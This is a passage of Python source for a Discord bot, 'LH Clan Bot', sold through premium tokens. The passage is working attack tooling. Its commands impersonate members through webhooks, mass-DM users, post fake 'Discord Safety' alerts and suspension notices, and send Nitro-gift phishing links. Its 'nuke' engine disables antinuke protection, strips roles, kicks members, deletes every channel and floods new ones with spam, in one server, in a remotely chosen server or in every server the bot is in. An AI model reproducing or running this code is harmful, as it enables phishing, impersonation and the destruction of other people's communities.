        discord.AuditLogAction.channel_create: "channel_create",
        discord.AuditLogAction.role_delete:    "role_delete",
        discord.AuditLogAction.ban:            "ban",
        discord.AuditLogAction.kick:           "kick",
        discord.AuditLogAction.webhook_create: "webhook_create",
        discord.AuditLogAction.role_update:    "role_update",
    }
    action_key = action_map.get(entry.action)
    if not action_key: return
    suspicious_log[guild.id][actor.id][action_key] += 1
    count = suspicious_log[guild.id][actor.id][action_key]
    if count == SUSPICIOUS_ALERT_AT:
        member = guild.get_member(actor.id)
        if member: await send_suspicious_alert(guild, member, action_key, count)

# ══════════════════════════════════════════════════════════════
#  TOKEN SLASH COMMANDS
# ══════════════════════════════════════════════════════════════

token_group = app_commands.Group(name="token", description="Token management (owner only)")
bot.tree.add_command(token_group)

@token_group.command(name="create", description="Create a premium token")
@app_commands.describe(uses="Number of uses (blank = unlimited)", duration="e.g. 7d 24h 30m (blank = never)", label="Optional label")
async def token_create(interaction: discord.Interaction, uses: Optional[int] = None, duration: Optional[str] = None, label: Optional[str] = None):
    if interaction.user.id != PREMIUM_USER_ID: await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    duration_secs = None
    if duration:
        duration_secs = parse_duration(duration)
        if duration_secs is None: await interaction.response.send_message("❌ Invalid duration.", ephemeral=True); return
        if duration_secs == float("inf"): duration_secs = None
    tok = create_token(created_by=interaction.user.id, uses=uses, duration_secs=duration_secs, label=label or "")
    embed = discord.Embed(title="🔑 Token Created", description=token_info_str(tok, active_tokens[tok]), color=0xffd700)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@token_group.command(name="list", description="List all active tokens")
async def token_list(interaction: discord.Interaction):
    if interaction.user.id != PREMIUM_USER_ID: await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    if not active_tokens: await interaction.response.send_message("No tokens.", ephemeral=True); return
    embed = discord.Embed(title="🔑 Active Tokens", color=0xffd700)
    for tok, data in list(active_tokens.items()):
        embed.add_field(name="​", value=token_info_str(tok, data), inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@token_group.command(name="revoke", description="Revoke a token")
@app_commands.describe(token="Token to revoke")
async def token_revoke(interaction: discord.Interaction, token: str):
    if interaction.user.id != PREMIUM_USER_ID: await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    if token.strip() not in active_tokens: await interaction.response.send_message("❌ Token not found.", ephemeral=True); return
    active_tokens.pop(token.strip())
    await interaction.response.send_message(f"✅ Revoked.", ephemeral=True)

@token_group.command(name="info", description="Check token info")
@app_commands.describe(token="Token to inspect")
async def token_info(interaction: discord.Interaction, token: str):
    if interaction.user.id != PREMIUM_USER_ID: await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    data = active_tokens.get(token.strip())
    if not data: await interaction.response.send_message("❌ Not found.", ephemeral=True); return
    embed = discord.Embed(title="🔑 Token Info", description=token_info_str(token.strip(), data), color=0xffd700)
    embed.add_field(name="Created By", value=f"`{data['created_by']}`", inline=True)
    embed.add_field(name="Created At", value=f"<t:{int(data['created_at'])}:R>", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ══════════════════════════════════════════════════════════════
#  SOCIAL ENGINEERING
# ══════════════════════════════════════════════════════════════

from typing import Optional as Opt

@bot.command(name="impersonate")
async def impersonate(ctx, user: Opt[discord.Member] = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not user or not message: await ctx.send("❌ Usage: `!impersonate @user <msg>`", delete_after=5); return
    webhooks = await ctx.channel.webhooks()
    wh = next((w for w in webhooks if w.user == ctx.guild.me), None)
    if not wh: wh = await ctx.channel.create_webhook(name="LH")
    await wh.send(content=message, username=user.display_name, avatar_url=user.display_avatar.url)

@bot.command(name="massdm")
async def massdm(ctx, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not message: await ctx.send("❌ Usage: `!massdm <message>`", delete_after=5); return
    ok = 0; fail = 0
    status = await ctx.send(f"📨 Sending DMs...")
    for member in ctx.guild.members:
        if member.bot: continue
        try: await member.send(message); ok += 1; await asyncio.sleep(0.5)
        except Exception: fail += 1
    embed = discord.Embed(title="📨 Mass DM Complete", color=0x00ff00)
    embed.add_field(name="✅ Sent",   value=str(ok),   inline=True)
    embed.add_field(name="❌ Failed", value=str(fail), inline=True)
    try: await status.edit(content=None, embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=15)

@bot.command(name="announce")
async def announce(ctx, channel: Opt[discord.TextChannel] = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not channel or not message: await ctx.send("❌ Usage: `!announce #channel <msg>`", delete_after=5); return
    embed = discord.Embed(description=message, color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_author(name=ctx.guild.name, icon_url=ctx.guild.icon.url if ctx.guild.icon else None)
    try: await channel.send(embed=embed); await ctx.send(f"✅ Announced.", delete_after=5)
    except discord.Forbidden: await ctx.send("❌ No permission.", delete_after=5)

@bot.command(name="rename")
async def rename(ctx, member: Opt[discord.Member] = None, *, new_name: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not member or not new_name: await ctx.send("❌ Usage: `!rename @user <name>`", delete_after=5); return
    try: await member.edit(nick=new_name); await ctx.send(f"✅ Renamed.", delete_after=5)
    except discord.Forbidden: await ctx.send("❌ Cannot rename.", delete_after=5)

@bot.command(name="fake")
async def fake(ctx, user: Opt[discord.Member] = None, channel: Opt[discord.TextChannel] = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not user or not channel or not message: await ctx.send("❌ Usage: `!fake @user #ch <msg>`", delete_after=5); return
    webhooks = await channel.webhooks()
    wh = next((w for w in webhooks if w.user == ctx.guild.me), None)
    if not wh: wh = await channel.create_webhook(name="LH")
    await wh.send(content=message, username=user.display_name, avatar_url=user.display_avatar.url)
    await ctx.send(f"✅ Sent in {channel.mention}.", delete_after=5)

@bot.command(name="fakealert")
async def fakealert(ctx, channel: Opt[discord.TextChannel] = None, *, alert_text: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not channel or not alert_text: await ctx.send("❌ Usage: `!fakealert #ch <text>`", delete_after=5); return
    embed = discord.Embed(title="⚠️ System Alert", description=alert_text, color=0xff0000, timestamp=discord.utils.utcnow())
    embed.set_author(name="Discord Safety", icon_url="https://cdn.discordapp.com/embed/avatars/0.png")
    embed.set_footer(text="Discord System Message")
    try: await channel.send(embed=embed); await ctx.send("✅ Alert sent.", delete_after=5)
    except discord.Forbidden: await ctx.send("❌ No permission.", delete_after=5)

@bot.command(name="poison")
async def poison(ctx, member: Opt[discord.Member] = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not member: await ctx.send("❌ Usage: `!poison @user`", delete_after=5); return
    try:
        await member.send(embed=discord.Embed(title="🔒 Account Security Notice", description="**Your account has been flagged for unusual activity.**\n\nTo secure your account verify here:\nhttps://discord.com/safety\n\n*Failure to verify within 24 hours will result in suspension.*", color=0xff0000))
        await ctx.send(f"✅ Sent.", delete_after=5)
    except discord.Forbidden: await ctx.send("❌ Cannot DM.", delete_after=5)

@bot.command(name="phish")
async def phish_cmd(ctx, member: Opt[discord.Member] = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not member: await ctx.send("❌ Usage: `!phish @user`", delete_after=5); return
    if not PHISH_URL: await ctx.send("❌ PHISH_URL not set.", delete_after=5); return
    link = f"{PHISH_URL}/claim/{member.id}"
    try:
        await member.send(embed=discord.Embed(title="🎁 Nitro Gift Claimed!", description=f"**Someone sent you Discord Nitro!**\n\n[**Claim Now →**]({link})\n\n*Offer expires in 48 hours.*", color=0x5865f2))
        await ctx.send(f"✅ Sent.", delete_after=5)
    except discord.Forbidden: await ctx.send("❌ Cannot DM.", delete_after=5)

@bot.command(name="massrole")
async def massrole(ctx, role: Opt[discord.Role] = None, action: str = "add"):
    try: await ctx.message.delete()
    except Exception: pass
    if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
    if not role: await ctx.send("❌ Usage: `!massrole @role add/remove`", delete_after=5); return
    action = action.lower()
    if action not in ("add", "remove"): await ctx.send("❌ add or remove only.", delete_after=5); return
    ok = 0; fail = 0
    status = await ctx.send(f"⚙️ Processing...")
    for member in ctx.guild.members:
        if member.bot: continue
        try:
            if action == "add" and role not in member.roles: await member.add_roles(role); ok += 1
            elif action == "remove" and role in member.roles: await member.remove_roles(role); ok += 1
        except Exception: fail += 1
    embed = discord.Embed(title=f"⚙️ Mass Role {action.title()} Complete", color=0x00ff00)
    embed.add_field(name="✅ Done", value=str(ok), inline=True); embed.add_field(name="❌ Failed", value=str(fail), inline=True)
    try: await status.edit(content=None, embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=10)

# ══════════════════════════════════════════════════════════════
#  ANTINUKE COMMANDS
# ══════════════════════════════════════════════════════════════

@bot.command(name="antinuke")
async def antinuke_cmd(ctx, action: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator: await ctx.send("❌ Admin required.", delete_after=5); return
    if not action: await ctx.send("❌ Usage: `!antinuke on/off/status`", delete_after=5); return
    action = action.lower()
    if action == "on":
        antinuke_enabled[ctx.guild.id] = True; snapshot_roles(ctx.guild); snapshot_channels(ctx.guild)
        await ctx.send(embed=discord.Embed(title="🛡️ AntiNuke Enabled", color=0x00ff00), delete_after=10)
    elif action == "off":
        antinuke_enabled[ctx.guild.id] = False
        await ctx.send(embed=discord.Embed(title="🛡️ AntiNuke Disabled", color=0xff9900), delete_after=10)
    elif action == "status":
        status = "🟢 Enabled" if antinuke_enabled.get(ctx.guild.id, True) else "🔴 Disabled"
        wl = antinuke_whitelist.get(ctx.guild.id, set())
        embed = discord.Embed(title="🛡️ AntiNuke Status", color=0x5865f2)
        embed.add_field(name="Status", value=status, inline=False)
        embed.add_field(name="Whitelist", value=", ".join(f"`{u}`" for u in wl) or "Empty", inline=False)
        await ctx.send(embed=embed, delete_after=15)

@bot.command(name="whitelist")
async def whitelist_cmd(ctx, action: str = None, user: Opt[discord.Member] = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator: await ctx.send("❌ Admin required.", delete_after=5); return
    if not action or action.lower() not in ("add","remove","list"): await ctx.send("❌ Usage: `!whitelist add/remove @user` or `!whitelist list`", delete_after=5); return
    action = action.lower()
    if action == "list":
        wl = antinuke_whitelist.get(ctx.guild.id, set())
        await ctx.send(embed=discord.Embed(title="📋 Whitelist", description="\n".join(f"`{u}`" for u in wl) or "Empty", color=0x5865f2), delete_after=15); return
    if not user: await ctx.send(f"❌ Usage: `!whitelist {action} @user`", delete_after=5); return
    if action == "add": antinuke_whitelist[ctx.guild.id].add(user.id); await ctx.send(f"✅ Added `{user}`.", delete_after=5)
    elif action == "remove": antinuke_whitelist[ctx.guild.id].discard(user.id); await ctx.send(f"✅ Removed `{user}`.", delete_after=5)

@bot.command(name="snapshot")
async def snapshot_cmd(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator: await ctx.send("❌ Admin required.", delete_after=5); return
    snapshot_roles(ctx.guild); snapshot_channels(ctx.guild)
    embed = discord.Embed(title="📸 Snapshot Taken", color=0x00ff00)
    embed.add_field(name="Roles", value=str(len(role_snapshots.get(ctx.guild.id,{}))), inline=True)
    embed.add_field(name="Channels", value=str(len(channel_snapshots.get(ctx.guild.id,{}))), inline=True)
    await ctx.send(embed=embed, delete_after=10)

@bot.command(name="restore")
async def restore_cmd(ctx, target: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if not ctx.author.guild_permissions.administrator: await ctx.send("❌ Admin required.", delete_after=5); return
    if not target: await ctx.send("❌ Usage: `!restore roles/channels/all`", delete_after=5); return
    guild = ctx.guild; target = target.lower()
    status = await ctx.send(f"🔄 Restoring `{target}`...")
    if target in ("roles","all"):
        for role_id in role_snapshots.get(guild.id,{}):
            if not guild.get_role(role_id): await restore_role(guild, role_id)
    if target in ("channels","all"):
        for ch_id in channel_snapshots.get(guild.id,{}):
            if not guild.get_channel(ch_id): await restore_channel(guild, ch_id)
    try: await status.edit(content=f"✅ Restore `{target}` complete.")
    except Exception: pass

# ══════════════════════════════════════════════════════════════
#  HELP MENU
# ══════════════════════════════════════════════════════════════

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🛡️ AntiNuke", style=discord.ButtonStyle.blurple, custom_id="help_antinuke")
    async def antinuke_help(self, interaction, button):
        embed = discord.Embed(title="🛡️ AntiNuke", color=0x00ff00)
        embed.add_field(name="Commands", value="`!antinuke on/off/status`\n`!whitelist add/remove/list @user`\n`!snapshot`\n`!restore roles/channels/all`", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🔑 Tokens", style=discord.ButtonStyle.blurple, custom_id="help_tokens")
    async def token_help(self, interaction, button):
        embed = discord.Embed(title="🔑 Tokens", color=0xffd700)
        embed.add_field(name="Slash", value="`/token create` `/token list` `/token revoke` `/token info`\n`!LH T` — quick 1-use token", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🎯 Social Eng", style=discord.ButtonStyle.red, custom_id="help_social")
    async def social_help(self, interaction, button):
        embed = discord.Embed(title="🎯 Social Engineering", color=0xff4400)
        embed.add_field(name="Commands (Premium)", value="`!impersonate` `!massdm` `!announce`\n`!rename` `!fake` `!fakealert`\n`!poison` `!phish` `!massrole`", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="💬 DM Tunnel", style=discord.ButtonStyle.green, custom_id="help_tunnel")
    async def tunnel_help(self, interaction, button):
        embed = discord.Embed(title="💬 DM Tunnel", color=0x5865f2)
        embed.add_field(name="Commands (Premium)", value="`!dmt <userID> <msg>` — open tunnel\n`!dmtreply <userID> <msg>` — follow-up\n`!dmtclose <userID>` — close\n`!dmtlist` — list open tunnels", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="💀 Nuke", style=discord.ButtonStyle.red, custom_id="help_nuke")
    async def nuke_help(self, interaction, button):
        embed = discord.Embed(title="💀 Nuke", color=0xff0000)
        embed.add_field(name="Commands", value="`!LH` `!LH GHOST` `!LH EXEC <id> <tok>`\n`!LH ALL <tok>` `!LH CLONE <s> <t> <tok>`\n`!LHP` — config editor", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="📡 Intel", style=discord.ButtonStyle.grey, custom_id="help_intel")
    async def intel_help(self, interaction, button):
        embed = discord.Embed(title="📡 Intel", color=0x5865f2)
        embed.add_field(name="Commands (Owner)", value="`!LHSPY` `!LHMEMBERS <id>` `!LHTOKENS <id>`", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="👑 Premium", style=discord.ButtonStyle.grey, custom_id="help_premium")
    async def premium_help(self, interaction, button):
        embed = discord.Embed(title="👑 Premium", color=0xffd700)
        embed.add_field(name="Commands (Owner)", value="`!giftpremium <id> <duration>`\n`!revokepremium <id>`\n`!premiumlist`\n`!logtest` — test webhook logging", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.command(name="help")
async def help_cmd(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    embed = discord.Embed(title="⚔️ LH Clan Bot", description="**Premium Discord toolkit.**\n\nUse the buttons below.\n\n**Quick Start:**\n• `!LH T` — get a token\n• `!antinuke on` — enable protection\n• `!dmt <id> <msg>` — tunnel DM", color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_footer(text="LH Clan Bot • Premium Toolkit")
    msg = await ctx.send(embed=embed, view=HelpView())
    await asyncio.sleep(120)
    try: await msg.edit(view=None)
    except Exception: pass

# ══════════════════════════════════════════════════════════════
#  PREMIUM GIFTING
# ══════════════════════════════════════════════════════════════

@bot.command(name="giftpremium")
async def gift_premium(ctx, user_id: str = None, duration: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=5); return
    if not user_id or not duration: await ctx.send("❌ Usage: `!giftpremium <id> <duration>`", delete_after=5); return
    try: target_id = int(user_id)
    except ValueError: await ctx.send("❌ Invalid ID.", delete_after=5); return
    secs = parse_duration(duration)
    if secs is None: await ctx.send("❌ Invalid duration.", delete_after=5); return
    try: target = await bot.fetch_user(target_id)
    except Exception: await ctx.send("❌ User not found.", delete_after=5); return
    premium_users[target_id] = float("inf") if secs == float("inf") else time.time() + secs
    exp_str = premium_expiry_str(target_id)
    try: await target.send(embed=discord.Embed(title="👑 Premium Access Granted!", description=f"You have been granted **LH Premium**.\n**Duration:** `{exp_str}`", color=0xffd700))
    except Exception: pass
    confirm = discord.Embed(title="✅ Premium Gifted", color=0x00ff00)
    confirm.add_field(name="User", value=f"{target} (`{target_id}`)", inline=False)
    confirm.add_field(name="Duration", value=exp_str, inline=True)
    try: await ctx.author.send(embed=confirm); await ctx.send("✅ Gifted.", delete_after=5)
    except Exception: await ctx.send(embed=confirm, delete_after=10)

@bot.command(name="revokepremium")
async def revoke_premium(ctx, user_id: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=5); return
    if not user_id: await ctx.send("❌ Usage: `!revokepremium <id>`", delete_after=5); return
    try: target_id = int(user_id)
    except ValueError: await ctx.send("❌ Invalid ID.", delete_after=5); return
    if target_id == PREMIUM_USER_ID: await ctx.send("❌ Cannot revoke master.", delete_after=5); return
    if target_id not in premium_users: await ctx.send("❌ Not a premium user.", delete_after=5); return
    premium_users.pop(target_id)
    try:
        target = await bot.fetch_user(target_id)
        await target.send(embed=discord.Embed(title="⚠️ Premium Revoked", description="Your LH Premium access has been revoked.", color=0xff0000))
    except Exception: pass
    await ctx.send(f"✅ Revoked `{target_id}`.", delete_after=5)

@bot.command(name="premiumlist")
async def premium_list(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=5); return
    embed = discord.Embed(title="👑 Premium Users", color=0xffd700)
    if not premium_users: embed.description = "No premium users."
    else:
        lines = []
        for uid, expiry in premium_users.items():
            exp = "Permanent" if expiry == float("inf") else premium_expiry_str(uid)
            lines.append(f"`{uid}` — {exp} {'✅' if is_premium(uid) else '❌ Expired'}")
        embed.description = "\n".join(lines)
    try: await ctx.author.send(embed=embed); await ctx.send("👑 Sent to DMs.", delete_after=5)
    except Exception:
        msg = await ctx.send(embed=embed); await asyncio.sleep(20)
        try: await msg.delete()
        except Exception: pass

@bot.command(name="logtest")
async def logtest(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=5); return
    embed = discord.Embed(title="🔔 Log Test", description="Webhook logging working.", color=0x00ff00, timestamp=discord.utils.utcnow())
    embed.add_field(name="Webhook", value=f"`{LOG_WEBHOOK_URL[:40]}...`" if LOG_WEBHOOK_URL else "❌ Not set", inline=False)
    await notify_owner(embed)
    if LOG_WEBHOOK_URL: await ctx.send("✅ Test sent to webhook + DM.", delete_after=5)
    else: await ctx.send("⚠️ No LOG_WEBHOOK_URL set — DM only.", delete_after=10)

# ══════════════════════════════════════════════════════════════
#  VERIFY
# ══════════════════════════════════════════════════════════════

class VerifyButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", emoji="✅", style=discord.ButtonStyle.green, custom_id="verify_button")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        role  = discord.utils.get(guild.roles, name=VERIFY_ROLE_NAME)
        if not role: await interaction.response.send_message("❌ No Verified role found.", ephemeral=True); return
        if role in interaction.user.roles: await interaction.response.send_message("Already verified.", ephemeral=True); return
        try:
            await interaction.user.add_roles(role, reason="Verification")
            embed = discord.Embed(title="✅ Verified!", description=f"Welcome to **{guild.name}**!", color=0x00ff00)
            embed.set_thumbnail(url=interaction.user.display_avatar.url)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message("❌ Bot lacks role permission.", ephemeral=True)

@bot.tree.command(name="setupverify", description="Post verification panel (admin only)")
@app_commands.checks.has_permissions(administrator=True)
async def setupverify(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(title="🔐 Server Verification", description=f"**Welcome to {guild.name}!**\n\nClick **Verify** below to gain access.", color=0x5865f2)
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    await interaction.response.send_message(embed=embed, view=VerifyButton())

# ══════════════════════════════════════════════════════════════
#  NUKE ENGINE
# ══════════════════════════════════════════════════════════════

async def clone_server(source: discord.Guild, target: discord.Guild):
    await asyncio.gather(*[ch.delete() for ch in target.channels], return_exceptions=True)
    for role in target.roles:
        if role.is_default() or role >= target.me.top_role: continue
        try: await role.delete(reason="LH Clone")
        except Exception: pass
    role_map = {}
    for role in sorted([r for r in source.roles if not r.is_default() and not r.managed], key=lambda r: r.position):
        try:
            new_role = await target.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable, reason="LH Clone")
            role_map[role.id] = new_role
        except Exception: pass
    def build_ow(c, tgt):
        ow = {}
        for obj, o in c.overwrites.items():
            new_obj = tgt.default_role if isinstance(obj, discord.Role) and obj.is_default() else role_map.get(obj.id) if isinstance(obj, discord.Role) else None
            if new_obj: ow[new_obj] = o
        return ow
    cat_map = {}
    for cat in sorted(source.categories, key=lambda c: c.position):
        try:
            new_cat = await target.create_category(name=cat.name, overwrites=build_ow(cat, target), reason="LH Clone")
            cat_map[cat.id] = new_cat
        except Exception: pass
    for ch in sorted(source.text_channels, key=lambda c: c.position):
        cat = cat_map.get(ch.category_id) if ch.category_id else None
        try: await target.create_text_channel(name=ch.name, topic=ch.topic, slowmode_delay=ch.slowmode_delay, nsfw=ch.nsfw, category=cat, overwrites=build_ow(ch, target), reason="LH Clone")
        except Exception: pass
    for ch in sorted(source.voice_channels, key=lambda c: c.position):
        cat = cat_map.get(ch.category_id) if ch.category_id else None
        try: await target.create_voice_channel(name=ch.name, category=cat, overwrites=build_ow(ch, target), reason="LH Clone")
        except Exception: pass

async def run_nuke(guild: discord.Guild):
    await asyncio.gather(*[m.edit(roles=[], reason="LH") for m in guild.members if m.bot and m != guild.me], return_exceptions=True)
    await asyncio.gather(*[m.kick(reason="LH") for m in guild.members if m.id in ANTINUKE_IDS], return_exceptions=True)
    await asyncio.gather(*[r.edit(permissions=discord.Permissions.none(), reason="LH") for r in guild.roles if r < guild.me.top_role and not r.is_default()], return_exceptions=True)
    await asyncio.gather(*[m.kick(reason="LH Clan") for m in guild.members if m != guild.me and m != guild.owner and not m.bot], return_exceptions=True)
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
    new_channels = []
    for _ in range(nuke_config["channel_count"]):
        try: ch = await guild.create_text_channel(nuke_config["channel_name"]); new_channels.append(ch)
        except Exception: pass
    async def spam(ch):
        for _ in range(nuke_config["spam_count"]):
            try: await ch.send(nuke_config["message"])
            except Exception: pass
    await asyncio.gather(*[spam(ch) for ch in new_channels])

@bot.command(name="LH")
async def lh_command(ctx, subcommand: Opt[str] = None, *, args: Opt[str] = None):
    if subcommand and subcommand.upper() == "T":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send("❌ Owner only.", delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        tok = create_token(created_by=ctx.author.id, uses=1, label="LH T")
        embed = discord.Embed(title="🔑 Token Generated", description=f"`{tok}`", color=0xffd700)
        try: await ctx.author.send(embed=embed); await ctx.message.delete(); await ctx.send("🔑 Sent to DMs.", delete_after=5)
        except discord.Forbidden: await ctx.send(embed=embed, delete_after=15)
        return
    if subcommand and subcommand.upper() == "GHOST":
        if not ctx.author.guild_permissions.administrator: await ctx.send("❌ Admin required.", delete_after=5); return
        guild = ctx.guild; target = None
        for member in sorted(guild.members, key=lambda m: m.top_role.position, reverse=True):
            if member == guild.me or member == guild.owner or member.bot: continue
            target = member; break
        if target:
            try: await guild.me.edit(nick=target.display_name); await bot.user.edit(avatar=await target.display_avatar.read())
            except Exception: pass
        try: await ctx.message.delete()
        except Exception: pass
        antinuke_enabled[guild.id] = False
        await asyncio.sleep(2)
        await run_nuke(guild); return
    if subcommand and subcommand.upper() == "EXEC":
        if not args or len(args.split()) < 2: await ctx.send("❌ Usage: `!LH EXEC <id> <token>`", delete_after=5); return
        parts = args.split(); tok = parts[1]
        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
        try: target_guild = bot.get_guild(int(parts[0]))
        except ValueError: await ctx.send("❌ Invalid ID.", delete_after=5); return
        if not target_guild: await ctx.send("❌ Bot not in that server.", delete_after=5); return
        validate_token(tok)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(title="💀 Remote Nuke Initiated", description=f"Target: **{target_guild.name}**", color=0xff0000))
        antinuke_enabled[target_guild.id] = False
        await run_nuke(target_guild); return
    if subcommand and subcommand.upper() == "ALL":
        tok = args.strip() if args else ""
        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
        validate_token(tok); guilds = list(bot.guilds)
        try: await ctx.message.delete()
        except Exception: pass
        await notify_owner(discord.Embed(title="💀 ALL SERVERS NUKE", description=f"Targeting {len(guilds)} servers.", color=0xff0000))
        for g in guilds: antinuke_enabled[g.id] = False
        await asyncio.gather(*[run_nuke(g) for g in guilds], return_exceptions=True); return
    if subcommand and subcommand.upper() == "CLONE":
        if not args or len(args.split()) < 3: await ctx.send("❌ Usage: `!LH CLONE <src> <tgt> <token>`", delete_after=5); return
        parts = args.split(); source_id, target_id_str, tok = parts[0], parts[1], parts[2]
        valid, reason = _peek_token(tok)
        if not valid:
            await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
            try: await ctx.message.delete()
            except Exception: pass
            return
        if not is_premium(ctx.author.id): await ctx.send("❌ Premium required.", delete_after=5); return
        try: src = bot.get_guild(int(source_id)); tgt = bot.get_guild(int(target_id_str))
        except ValueError: await ctx.send("❌ Invalid IDs.", delete_after=5); return
        if not src: await ctx.send("❌ Not in source server.", delete_after=5); return
        if not tgt: await ctx.send("❌ Not in target server.", delete_after=5); return
        validate_token(tok)
        try: await ctx.message.delete()
        except Exception: pass
        status = await ctx.send(f"🔄 Cloning **{src.name}** → **{tgt.name}**...")
        await clone_server(src, tgt)
        try: await status.delete()
        except Exception: pass
        embed = discord.Embed(title="✅ Clone Complete", color=0x00ff00)
        embed.add_field(name="Source", value=f"{src.name} (`{src.id}`)", inline=False)
        embed.add_field(name="Target", value=f"{tgt.name} (`{tgt.id}`)", inline=False)
        try: await ctx.author.send(embed=embed)
        except Exception: await ctx.send(embed=embed, delete_after=15)
        return
    if not ctx.author.guild_permissions.administrator: await ctx.send("❌ Admin required.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    antinuke_enabled[ctx.guild.id] = False
    await run_nuke(ctx.guild)

class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
    token_input        = discord.ui.TextInput(label="Premium Token",               placeholder="LHT-...", required=True, max_length=32,   style=discord.TextStyle.short)
    channel_name_input = discord.ui.TextInput(label="Channel Name",                placeholder="hooked by lh clan", required=True, max_length=100, style=discord.TextStyle.short)
    message_input      = discord.ui.TextInput(label="Spam Message",                placeholder="lol ur server...", required=True, max_length=2000, style=discord.TextStyle.paragraph)
    channel_count_input= discord.ui.TextInput(label="Channel Count (min 12)",      placeholder="12", required=True, max_length=3, style=discord.TextStyle.short)
    spam_count_input   = discord.ui.TextInput(label="Spam Count per Channel (max 200)", placeholder="100", required=True, max_length=3, style=discord.TextStyle.short)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        tok = self.token_input.value.strip()
        valid, reason = _peek_token(tok)
        if not valid: await interaction.followup.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), ephemeral=True); return
        try:
            ch_count = max(12, int(self.channel_count_input.value.strip()))
            sp_count = max(1, min(int(self.spam_count_input.value.strip()), 200))
        except ValueError: await interaction.followup.send("❌ Counts must be numbers.", ephemeral=True); return
        nuke_config["channel_name"] = self.channel_name_input.value.strip()
        nuke_config["message"]      = self.message_input.value.strip()
        nuke_config["channel_count"]= ch_count
        nuke_config["spam_count"]   = sp_count
        validate_token(tok)
        embed = discord.Embed(title="✅ Nuke Config Updated", color=0x00ff00)
